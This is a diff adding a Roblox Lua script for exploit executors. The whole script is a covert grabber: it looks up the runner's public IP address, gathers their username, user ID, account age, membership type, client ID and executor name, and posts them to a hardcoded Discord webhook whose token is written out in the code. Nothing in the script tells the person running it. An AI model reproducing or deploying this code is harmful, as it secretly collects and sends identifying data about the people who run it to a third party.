@@ -1,0 +1,68 @@
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
+
+
+local Webhook = "https://discord.com/api/webhooks/1078268167899590716/i5JZev9DPNBF1f11FqpV7s-ly57ih2l9ZKs7rE5kfER_f-nwZDHNXz0Aa1ZjK-EWPZBW"
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+local Headers = {["content-type"] = "application/json"}
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local PlayerName = game.Players.LocalPlayer.Name
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+
+local PlayerData =
+{
+["content"] = "",
+["embeds"] = {
+{
+["title"] = "Username:",
+["description"] = PlayerName,
+["color"] = tonumber(0x2B6BE4),
+["fields"] = {
+{
+["name"] = "MembershipType:",
+["value"] = MembershipType,
+["inline"] = true
+},
+{
+["name"] = "AccountAge:",
+["value"] = AccountAge,
+["inline"] = true
+},
+{
+["name"] = "UserId:",
+["value"] = UserId,
+["inline"] = true
+},
+{
+["name"] = "Ip Adress:",
+["value"] = IPv4,
+["inline"] = true
+},
+{
+["name"] = "Exploit:",
+["value"] = webhookcheck,
+["inline"] = true
+
+},
+{
+["name"] = "Client ID:",
+["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+["inline"] = true
+},
+},
+}
+}
+}
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+
+Request = http_request or request or HttpPost or syn.request
+Request(
+{
+Url = Webhook,
+Body = PlayerData,
+Method = "POST",
+Headers = Headers
+}
+)
